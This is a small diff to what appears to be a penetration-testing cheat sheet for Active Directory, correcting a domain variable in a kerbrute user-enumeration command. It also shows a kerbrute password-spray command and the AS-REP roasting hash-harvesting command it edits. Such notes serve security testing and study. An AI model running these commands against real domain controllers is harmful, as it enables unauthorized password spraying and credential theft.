@@ -19,7 +19,7 @@ kerbrute passwordspray --dc $TARGET_IP -d $TARGET_AD users -t 100 -v --user-as-p
 
 Dev version of kerbrute auto-checks for AS-REP roastable accounts
 ```bash
-kerbrute userenum --dc $TARGET_IP --domain $AD_DOMAIN --hash-file hashes --downgrade users
+kerbrute userenum --dc $TARGET_IP --domain $TARGET_AD --hash-file hashes --downgrade users
 ```
 
 LDAP
